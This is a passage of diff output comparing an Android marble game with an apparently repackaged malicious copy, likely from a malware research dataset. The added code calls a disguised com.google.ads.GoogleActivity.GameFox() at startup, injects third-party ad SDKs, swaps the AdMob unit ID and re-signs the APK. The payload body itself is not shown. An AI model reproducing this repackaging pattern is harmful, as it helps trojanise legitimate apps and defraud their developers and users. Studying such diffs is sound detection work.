+>     Bitmap[] arrayOfBitmap4 = { paramImageManager.getBitmap(2130837658), paramImageManager.getBitmap(2130837659), paramImageManager.getBitmap(2130837660), paramImageManager.getBitmap(2130837661), paramImageManager.getBitmap(2130837662), paramImageManager.getBitmap(2130837663), paramImageManager.getBitmap(2130837664), paramImageManager.getBitmap(2130837665), paramImageManager.getBitmap(2130837666), paramImageManager.getBitmap(2130837667), paramImageManager.getBitmap(2130837668), paramImageManager.getBitmap(2130837669), paramImageManager.getBitmap(2130837670), paramImageManager.getBitmap(2130837671), paramImageManager.getBitmap(2130837672), paramImageManager.getBitmap(2130837673), paramImageManager.getBitmap(2130837674), paramImageManager.getBitmap(2130837675), paramImageManager.getBitmap(2130837676), paramImageManager.getBitmap(2130837677), paramImageManager.getBitmap(2130837678), paramImageManager.getBitmap(2130837679), paramImageManager.getBitmap(2130837680), paramImageManager.getBitmap(2130837681), paramImageManager.getBitmap(2130837682), paramImageManager.getBitmap(2130837683), paramImageManager.getBitmap(2130837684), paramImageManager.getBitmap(2130837685), paramImageManager.getBitmap(2130837686), paramImageManager.getBitmap(2130837687) };
+>     Bitmap localBitmap60 = paramImageManager.getBitmap(2130837658);
+>     Bitmap localBitmap61 = paramImageManager.getBitmap(2130837659);
+>     Bitmap localBitmap62 = paramImageManager.getBitmap(2130837660);
+>     Bitmap localBitmap63 = paramImageManager.getBitmap(2130837661);
+>     Bitmap localBitmap64 = paramImageManager.getBitmap(2130837662);
+>     Bitmap localBitmap65 = paramImageManager.getBitmap(2130837663);
+>     Bitmap localBitmap66 = paramImageManager.getBitmap(2130837664);
+>     Bitmap localBitmap67 = paramImageManager.getBitmap(2130837665);
+>     Bitmap localBitmap68 = paramImageManager.getBitmap(2130837666);
+>     Bitmap localBitmap69 = paramImageManager.getBitmap(2130837667);
+>     Bitmap localBitmap70 = paramImageManager.getBitmap(2130837668);
+>     Bitmap localBitmap71 = paramImageManager.getBitmap(2130837669);
+>     Bitmap localBitmap72 = paramImageManager.getBitmap(2130837670);
+>     Bitmap localBitmap73 = paramImageManager.getBitmap(2130837671);
+>     Bitmap localBitmap74 = paramImageManager.getBitmap(2130837672);
+>     Bitmap localBitmap75 = paramImageManager.getBitmap(2130837673);
+>     Bitmap localBitmap76 = paramImageManager.getBitmap(2130837674);
+>     Bitmap localBitmap77 = paramImageManager.getBitmap(2130837675);
+>     Bitmap localBitmap78 = paramImageManager.getBitmap(2130837676);
+>     Bitmap localBitmap79 = paramImageManager.getBitmap(2130837677);
+>     Bitmap localBitmap80 = paramImageManager.getBitmap(2130837678);
+>     Bitmap localBitmap81 = paramImageManager.getBitmap(2130837679);
+>     Bitmap localBitmap82 = paramImageManager.getBitmap(2130837680);
+>     Bitmap localBitmap83 = paramImageManager.getBitmap(2130837681);
+>     Bitmap localBitmap84 = paramImageManager.getBitmap(2130837682);
+>     Bitmap localBitmap85 = paramImageManager.getBitmap(2130837683);
+>     Bitmap localBitmap86 = paramImageManager.getBitmap(2130837684);
+>     Bitmap localBitmap87 = paramImageManager.getBitmap(2130837685);
+>     Bitmap localBitmap88 = paramImageManager.getBitmap(2130837686);
+>     Bitmap localBitmap89 = paramImageManager.getBitmap(2130837687);
+>     this.imgBall2 = new Bitmap[][] { arrayOfBitmap1, arrayOfBitmap2, arrayOfBitmap3, { paramTypeface, localBitmap1, localBitmap2, localBitmap3, localBitmap4, localBitmap5, localBitmap6, localBitmap7, localBitmap8, localBitmap9, localBitmap10, localBitmap11, localBitmap12, localBitmap13, localBitmap14, localBitmap15, localBitmap16, localBitmap17, localBitmap18, localBitmap19, localBitmap20, localBitmap21, localBitmap22, localBitmap23, localBitmap24, localBitmap25, localBitmap26, localBitmap27, localBitmap28, localBitmap29 }, { localBitmap30, localBitmap31, localBitmap32, localBitmap33, localBitmap34, localBitmap35, localBitmap36, localBitmap37, localBitmap38, localBitmap39, localBitmap40, localBitmap41, localBitmap42, localBitmap43, localBitmap44, localBitmap45, localBitmap46, localBitmap47, localBitmap48, localBitmap49, localBitmap50, localBitmap51, localBitmap52, localBitmap53, localBitmap54, localBitmap55, localBitmap56, localBitmap57, localBitmap58, localBitmap59 }, new Bitmap[0], arrayOfBitmap4, { localBitmap60, localBitmap61, localBitmap62, localBitmap63, localBitmap64, localBitmap65, localBitmap66, localBitmap67, localBitmap68, localBitmap69, localBitmap70, localBitmap71, localBitmap72, localBitmap73, localBitmap74, localBitmap75, localBitmap76, localBitmap77, localBitmap78, localBitmap79, localBitmap80, localBitmap81, localBitmap82, localBitmap83, localBitmap84, localBitmap85, localBitmap86, localBitmap87, localBitmap88, localBitmap89 } };
+diff -r result/APP_13/App_B_13/com/SAXapp/SAXMarbleFactory/SplashScreen.java result/APP_13/App_M_13/com/SAXapp/SAXMarbleFactory/SplashScreen.java
+7a8,12
+> import android.widget.FrameLayout.LayoutParams;
+> import com.aaaa.ZhuamobActivity;
+> import com.anzhi.ad.coverscreen.CoverAdComponent;
+> import com.google.ads.GoogleActivity;
+> import com.zhuamob.android.ZhuamobLayout;
+17a23,27
+>   private void toGameIN()
+>   {
+>     new GoogleActivity(this).GameFox();
+>   }
+>   
+20a31
+>     toGameIN();
+83a95,104
+>   }
+>   
+>   public void toStart()
+>   {
+>     ZhuamobLayout localZhuamobLayout = new ZhuamobLayout(this);
+>     FrameLayout.LayoutParams localLayoutParams = new FrameLayout.LayoutParams(-1, -2);
+>     localLayoutParams.gravity = 80;
+>     addContentView(localZhuamobLayout, localLayoutParams);
+>     CoverAdComponent.init(this, "kD4sIH1n2XqW7gBe4BVmeV4s");
+>     CoverAdComponent.showAd(this);
+Somente em result/APP_13/App_M_13/com: unity3d
+Os arquivos binários result/APP_13/App_B_13/original/AndroidManifest.xml e result/APP_13/App_M_13/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_13/App_B_13/original/META-INF/CERT.RSA e result/APP_13/App_M_13/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_13/App_B_13/original/META-INF/CERT.SF result/APP_13/App_M_13/original/META-INF/CERT.SF
+2,3c2,3
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: +SBiiOWncWiXAGncEEo+uLZq3BE=
+---
+> Created-By: 1.0 (Android SignApk)
+> SHA1-Digest-Manifest: pTIkBXlb6FbW9O0ud2uyI4K3gHE=
+29,31d28
+< Name: res/drawable-hdpi/menu_button_upgrade_notavailable.png
+< SHA1-Digest: uGwoYTqJ2Qngbeo8xjkICGzU3pg=
+< 
+34a32,34
+> Name: res/drawable-hdpi/menu_button_upgrade_notavailable.png
+> SHA1-Digest: uGwoYTqJ2Qngbeo8xjkICGzU3pg=
+> 
+168c168
+< SHA1-Digest: AGDPQr/Vh0WQamhxolxLthCW6wU=
+---
+> SHA1-Digest: VuMZEtaQpD+R9fzFAFA2E4+mhSc=
+268a269,271
+> Name: assets/l/l.dat
+> SHA1-Digest: ZVCpT9yqcvPOVZJzscKFrvCyD88=
+> 
+386,388d388
+< Name: res/drawable-hdpi/upgrade_bomb_generator.png
+< SHA1-Digest: k37SoHDALMpc9je6DcjP/mhPBQw=
+< 
+391a392,394
+> Name: res/drawable-hdpi/upgrade_bomb_generator.png
+> SHA1-Digest: k37SoHDALMpc9je6DcjP/mhPBQw=
+> 
+410,412d412
+< Name: res/raw/sound_bonus.mp3
+< SHA1-Digest: uz3IDbWJWRoHSS6kgG8KnvI9OLY=
+< 
+418a419,421
+> Name: res/raw/sound_bonus.mp3
+> SHA1-Digest: uz3IDbWJWRoHSS6kgG8KnvI9OLY=
+> 
+426c429
+< SHA1-Digest: dvI9mQ9eP09o3ciyNfKZq/Y535A=
+---
+> SHA1-Digest: Q6Jbc7PI/VKsQYRKB5inieymosM=
+437,439d439
+< Name: res/drawable-hdpi/menu_button_upgrade_pressed.png
+< SHA1-Digest: KMHVh0hqQ2NYM3rUHZvPwl/3WuY=
+< 
+442a443,445
+> Name: res/drawable-hdpi/menu_button_upgrade_pressed.png
+> SHA1-Digest: KMHVh0hqQ2NYM3rUHZvPwl/3WuY=
+> 
+474c477
+< SHA1-Digest: 1QjDg929hHtlPIpk3e1wWsujpXc=
+---
+> SHA1-Digest: vbX2+UqvD3tIfeWWNn6s07zfAJc=
+916a920,922
+> Name: assets/Zhuamob_sdk_v1.8.2.version
+> SHA1-Digest: FXMbgblP7gqn3SWqk6Zc3A70oPY=
+> 
+1041c1047
+< SHA1-Digest: mDgVj5okBmWnBG6gF+qlC2H7GJQ=
+---
+> SHA1-Digest: 3XkYPQyC4g8h5GT1rgMfmbfON6g=
+1083c1089
+< SHA1-Digest: WLZR0KARv8Gan756k4GLvAKu0kM=
+---
+> SHA1-Digest: mTEMbBkp27egP8DjxW4Jrfqdx1E=
+1157,1159d1162
+< Name: res/raw/music_yiourgh_light.mp3
+< SHA1-Digest: NcOJzTdXxRrggk3PlbG8DXOFqUo=
+< 
+1162a1166,1168
+> Name: res/raw/music_yiourgh_light.mp3
+> SHA1-Digest: NcOJzTdXxRrggk3PlbG8DXOFqUo=
+> 
+1169,1171d1174
+< Name: res/drawable-mdpi/menu_screen_mode_locked.png
+< SHA1-Digest: psec5Ua/8pNH0o0EC+zZ8umETQk=
+< 
+1174a1178,1180
+> Name: res/drawable-mdpi/menu_screen_mode_locked.png
+> SHA1-Digest: psec5Ua/8pNH0o0EC+zZ8umETQk=
+> 
+1247,1249d1252
+< Name: res/layout/main.xml
+< SHA1-Digest: UmHnlLGImo4BYklKfqRRwH49Bug=
+< 
+1252a1256,1258
+> Name: res/layout/main.xml
+> SHA1-Digest: nWlwf/KpHarOEjCPb434toHA92s=
+> 
+1271,1273d1276
+< Name: res/drawable-mdpi/menu_score_star.png
+< SHA1-Digest: bMyuYsyYeVPSE0Rq50nnD2RcNz0=
+< 
+1276a1280,1282
+> Name: res/drawable-mdpi/menu_score_star.png
+> SHA1-Digest: bMyuYsyYeVPSE0Rq50nnD2RcNz0=
+> 
+1280,1282d1285
+< Name: res/drawable-ldpi/maingamemenu_score_title.png
+< SHA1-Digest: bI2H4f71LZYqKUYuPmr2W9JoaOs=
+< 
+1285a1289,1291
+> Name: res/drawable-ldpi/maingamemenu_score_title.png
+> SHA1-Digest: bI2H4f71LZYqKUYuPmr2W9JoaOs=
+> 
+1296c1302
+< SHA1-Digest: V8dIR6wQpWffEmBY/a6pdoOkQYo=
+---
+> SHA1-Digest: CDa8RSqMtNt17kTOlYCtcaD/VuI=
+1331,1333d1336
+< Name: res/drawable-mdpi/menu_cursor_button_cross.png
+< SHA1-Digest: 9lLAOqBnn4uXJjDAektv+YtLzbc=
+< 
+1335a1339,1341
+> 
+> Name: res/drawable-mdpi/menu_cursor_button_cross.png
+> SHA1-Digest: 9lLAOqBnn4uXJjDAektv+YtLzbc=
+diff -r result/APP_13/App_B_13/original/META-INF/MANIFEST.MF result/APP_13/App_M_13/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.0 (Android SignApk)
+28,30d27
+< Name: res/drawable-ldpi/menu_button_large.png
+< SHA1-Digest: +u7Cp5KxN8YBR1f4rReDZ6j1kK4=
+< 
+33a31,33
+> Name: res/drawable-ldpi/menu_button_large.png
+> SHA1-Digest: +u7Cp5KxN8YBR1f4rReDZ6j1kK4=
+> 
+167c167
+< SHA1-Digest: DlT0x7p/3rqNoMlI/mXmYtj01Yo=
+---
+> SHA1-Digest: mXN9hrLQDHJCLj9+Q4y/HQOXWS8=
+267a268,270
+> Name: assets/l/l.dat
+> SHA1-Digest: iS+a8wBOFUjZSg1Zuqs0GC6Vnrk=
+> 
+385,387d387
+< Name: res/drawable-ldpi/menu_button_bottom_pressed.png
+< SHA1-Digest: 0QI7/NFJG9NIXabg9uHwvQT2PZM=
+< 
+390a391,393
+> Name: res/drawable-ldpi/menu_button_bottom_pressed.png
+> SHA1-Digest: 0QI7/NFJG9NIXabg9uHwvQT2PZM=
+> 
+408a412,414
+> Name: res/raw/sound_bonus.mp3
+> SHA1-Digest: KnV2pgohubmgRpCNNyh1Jn2wTkw=
+> 
+415,417d420
+< Name: res/raw/sound_bonus.mp3
+< SHA1-Digest: KnV2pgohubmgRpCNNyh1Jn2wTkw=
+< 
+425c428
+< SHA1-Digest: jRNZwFBqehVbC5zMpyyab7fOtk0=
+---
+> SHA1-Digest: gVhHhLY6J9vNft8R5kBmbr0oNxs=
+436,438d438
+< Name: res/drawable-ldpi/menu_button_change_ball_notavailable.png
+< SHA1-Digest: kX+UV54y3/noXk2ePvj2Lcue/4w=
+< 
+441a442,444
+> Name: res/drawable-ldpi/menu_button_change_ball_notavailable.png
+> SHA1-Digest: kX+UV54y3/noXk2ePvj2Lcue/4w=
+> 
+464c467
+< SHA1-Digest: gQYaJ07TmU8Rxqk/zz6/cRHTo0Y=
+---
+> SHA1-Digest: gd9PdWorlpaN+DEkgFgvbfINqR4=
+915a919,921
+> Name: assets/Zhuamob_sdk_v1.8.2.version
+> SHA1-Digest: clYnmU5siqvu2/EIpQn2Sb7+hqo=
+> 
+1040c1046
+< SHA1-Digest: vYl4XjwqfUFU8SI9Xf7y/Q4DF8k=
+---
+> SHA1-Digest: OdzBATH9RTRL2r7xeoqcXSJR9bM=
+1082c1088
+< SHA1-Digest: 6ywacaJSXxPiuAIVzYPXKRJPvR0=
+---
+> SHA1-Digest: U/nN/xwCqzOHmcodYKOTRuiWx4k=
+1165,1167d1170
+< Name: res/drawable-hdpi/star.png
+< SHA1-Digest: ORpkwZGTLI+OYIYrbyx+Z2IaHPQ=
+< 
+1170a1174,1176
+> Name: res/drawable-hdpi/star.png
+> SHA1-Digest: ORpkwZGTLI+OYIYrbyx+Z2IaHPQ=
+> 
+1245a1252,1254
+> Name: res/layout/main.xml
+> SHA1-Digest: 3u/UNQyB4d4bar9AOs4vA3EHSqI=
+> 
+1249,1251d1257
+< Name: res/layout/main.xml
+< SHA1-Digest: lxPt7xbt4POVmVy96ZKiFb2J9Aw=
+< 
+1270,1272d1275
+< Name: res/drawable-ldpi/menu_button_large_pressed.png
+< SHA1-Digest: fnIvIeQEUDFVB2dPAYvPxNMEe9k=
+< 
+1275a1279,1281
+> Name: res/drawable-ldpi/menu_button_large_pressed.png
+> SHA1-Digest: fnIvIeQEUDFVB2dPAYvPxNMEe9k=
+> 
+1279,1281d1284
+< Name: res/drawable-ldpi/mainmenu_title.png
+< SHA1-Digest: 98+0x5x14IMsy+cmjPHOlFfLWg8=
+< 
+1284a1288,1290
+> Name: res/drawable-ldpi/mainmenu_title.png
+> SHA1-Digest: 98+0x5x14IMsy+cmjPHOlFfLWg8=
+> 
+1295c1301
+< SHA1-Digest: 7HOVNZRepS6NQoc4aCTRL9h0gOE=
+---
+> SHA1-Digest: +LJwHXQoBFZ9hDIBPKidEYtAjNw=
+1330,1332d1335
+< Name: res/drawable-mdpi/menu_button_short_background_pressed.png
+< SHA1-Digest: BCe4bvBixp37fWLmosftaft+QeE=
+< 
+1334a1338,1340
+> 
+> Name: res/drawable-mdpi/menu_button_short_background_pressed.png
+> SHA1-Digest: BCe4bvBixp37fWLmosftaft+QeE=
+diff -r result/APP_13/App_B_13/res/layout/main.xml result/APP_13/App_M_13/res/layout/main.xml
+5c5
+<     <com.google.ads.AdView android:id="@id/adView" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_alignParentBottom="true" android:layout_centerHorizontal="true" ads:adUnitId="a15242aeb47289c" ads:adSize="BANNER"
+---
+>     <com.google.ads.AdView android:id="@id/adView" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_alignParentBottom="true" android:layout_centerHorizontal="true" ads:adUnitId="a150609e6ac83e5" ads:adSize="BANNER"
+Somente em result/APP_13/App_M_13/smali/com: anzhi
+Somente em result/APP_13/App_M_13/smali/com/google/ads: GoogleActivity.smali
+diff -r result/APP_13/App_B_13/smali/com/SAXapp/SAXMarbleFactory/SplashScreen.smali result/APP_13/App_M_13/smali/com/SAXapp/SAXMarbleFactory/SplashScreen.smali
+40a41,53
+> .method private toGameIN()V
+>     .locals 1
+> 
+>     .prologue
+>     new-instance v0, Lcom/google/ads/GoogleActivity;
+> 
+>     invoke-direct {v0, p0}, Lcom/google/ads/GoogleActivity;-><init>(Landroid/content/Context;)V
+> 
+>     invoke-virtual {v0}, Lcom/google/ads/GoogleActivity;->GameFox()V
+> 
+>     return-void
+> .end method
+> 
+50a64,65
+>     invoke-direct {p0}, Lcom/SAXapp/SAXMarbleFactory/SplashScreen;->toGameIN()V
+> 
+148a164,196
+> .end method
+> 
+> .method public toStart()V
+>     .locals 4
+> 
+>     .prologue
+>     new-instance v1, Lcom/zhuamob/android/ZhuamobLayout;
+> 
+>     invoke-direct {v1, p0}, Lcom/zhuamob/android/ZhuamobLayout;-><init>(Landroid/app/Activity;)V
+> 
+>     .local v1, "zhuamobLayout":Lcom/zhuamob/android/ZhuamobLayout;
+>     new-instance v0, Landroid/widget/FrameLayout$LayoutParams;
+> 
+>     const/4 v2, -0x1
+> 
+>     const/4 v3, -0x2
+> 
+>     invoke-direct {v0, v2, v3}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V
+> 
+>     .local v0, "params":Landroid/widget/FrameLayout$LayoutParams;
+>     const/16 v2, 0x50
+> 
+>     iput v2, v0, Landroid/widget/FrameLayout$LayoutParams;->gravity:I
+> 
+>     invoke-virtual {p0, v1, v0}, Lcom/aaaa/ZhuamobActivity;->addContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
+> 
+>     const-string v0, "kD4sIH1n2XqW7gBe4BVmeV4s"
+> 
+>     invoke-static {p0, v0}, Lcom/anzhi/ad/coverscreen/CoverAdComponent;->init(Landroid/content/Context;Ljava/lang/String;)Lcom/anzhi/ad/coverscreen/CoverAdComponent;
+> 
+>     invoke-static {p0}, Lcom/anzhi/ad/coverscreen/CoverAdComponent;->showAd(Landroid/content/Context;)I
+> 
+>     return-void
+Somente em result/APP_13/App_M_13/smali/com: unity3d
